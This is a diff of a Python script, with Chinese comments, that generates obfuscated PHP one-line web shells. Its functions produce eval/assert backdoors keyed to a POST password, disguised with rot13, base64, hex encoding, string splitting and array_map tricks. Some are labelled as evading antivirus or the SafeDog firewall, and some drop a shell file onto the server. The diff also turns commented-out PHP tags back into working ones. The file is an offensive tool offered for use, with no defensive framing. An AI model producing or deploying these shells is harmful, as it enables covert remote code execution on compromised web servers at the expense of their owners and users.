@@ -2,24 +2,29 @@
 import random
 import base64
 
+
 def rot13(message):
     first = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
     trance = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
     return message.translate(str.maketrans(first, trance))
 
+#最基本的一句话木马
 def php_base(pwd):
     return "<?php @eval($_POST['"+pwd+"']);?>"
 
+#array混淆1
 def php_array_confusion1(pwd):
     return "<?php array_map('assert',(array)$_REQUEST['"+pwd+"']);?>"
 
+#array混淆2
 def php_array_confusion2(pwd):
     return "<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['"+pwd+"']);?>"
 
+#rot13编码
 def php_rot13(pwd):
     return "<?php eval(str_rot13('"+rot13("eval($_POST['"+pwd+"']);")+"'));?>"
 
-#使用array混淆
+#array_map+assert+func_encode
 def php_func_encode(pwd,chouse=0):
     if chouse!='' and int(chouse)>=1 and int(chouse)<=3:
         r=int(chouse)
@@ -32,6 +37,7 @@ def php_func_encode(pwd,chouse=0):
     elif r==3:
         return r"<?php array_map('a\x73s\x65rt',(array)$_REQUEST['"+pwd+"']);?>"
 
+#一次base64混淆
 def php_base64_confusion(pwd):
     return "<?php $x=base64_decode('YXNzZXJ0');$x($_POST['"+pwd+"']);?>"
 
@@ -46,6 +52,7 @@ def php_muti_base64(pwd,num=0):
         t='eval(base64_decode('+str(base64.b64encode(bytes(t, encoding = "utf8")), encoding = "utf8")+'))'
     return '<?php '+t+';?>'
 
+#关键字编码
 def php_word_coded(pwd):
     t=''
     for item in pwd:
@@ -68,6 +75,7 @@ def php_note_confusion(pwd):
     t+=']);?>'
     return t
 
+#关键字分割
 def php_str_splicing(pwd):
     return '''<?php
  
@@ -97,7 +105,7 @@ $_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
 
 #免杀
 def php_miansha(pwd):
-    return '<!--?php $x="as"."se"."rt";$x($_POST["'+pwd+'"]);?-->'
+    return '<?php $x="as"."se"."rt";$x($_POST["'+pwd+'"]);?>'
 
 
 def php_jianjiexxiema():
@@ -115,7 +123,7 @@ def php_jianjiexxiema():
         return s
 
     if codecmode=='1':
-        base='<!--?php fputs (fopen(pack("H*","{fname}"),"w"),pack("H*","{pwd}"))?-->'
+        base='<?php fputs (fopen(pack("H*","{fname}"),"w"),pack("H*","{pwd}"))?>'
         pwd='<?@eval($_POST[{}])?>'.format(pwd)
 
         fname=''.join([expansion(hex(ord(c)).replace('0x', '')) for c in fname])
@@ -124,21 +132,22 @@ def php_jianjiexxiema():
 
     elif codecmode=='2':
         import base64
-        base="<!--?php @fputs(fopen(base64_decode('{fname}'),w),base64_decode('{pwd}'));?-->"
+        base="<?php @fputs(fopen(base64_decode('{fname}'),w),base64_decode('{pwd}'));?>"
         pwd="<?php @eval($_POST['{}']);?>".format(pwd)
 
         fname=base64.b64encode(fname.encode('utf-8')).decode('utf-8')
         pwd=base64.b64encode(pwd.encode('utf-8')).decode('utf-8')
         return base.format(fname=fname,pwd=pwd)
 
-
+#无问号的一句话
 def php_no_wenhao(pwd):
     return '''<script type="text/javascript" language="php">// <![CDATA[ 
 eval ($_POST[{}]); 
 // ]]></script>'''.format(pwd)
 
 def php_guogou(pwd):
+    '''过狗一句话'''
     print("//菜刀地址 http://xx/xx.php?s=assert'")
-    return '<!--?php ($_=@$_GET[s]).@$_($_POST[{}])?--> '.format(pwd)
+    return '<?php ($_=@$_GET[s]).@$_($_POST[{}])?> '.format(pwd)
 
 
